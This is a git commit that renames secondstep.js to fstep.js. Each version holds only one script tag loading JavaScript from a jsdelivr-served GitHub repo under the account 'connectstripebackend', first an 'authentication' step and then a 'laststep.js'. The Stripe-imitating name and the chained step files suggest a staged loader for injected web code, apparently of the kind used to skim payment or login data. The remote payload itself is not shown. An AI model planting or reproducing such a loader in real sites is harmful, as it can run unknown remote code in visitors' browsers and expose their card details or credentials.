6aaea209710e871b9e103d9aa634a3500a54241c
connectstripebackend <flborn305@gmail.com>
2026-07-29 04:08:45 -0400

    Update and rename secondstep.js to fstep.js

---
+++ fstep.js
@@ -0,0 +1,1 @@
+<script src="https://cdn.jsdelivr.net/gh/connectstripebackend/backendconnect@main/laststep.js"></script>
--- secondstep.js
+++
@@ -1,1 +0,0 @@
-<script src="https://cdn.jsdelivr.net/gh/connectstripebackend/authentication@main/authfirststep.js"></script>
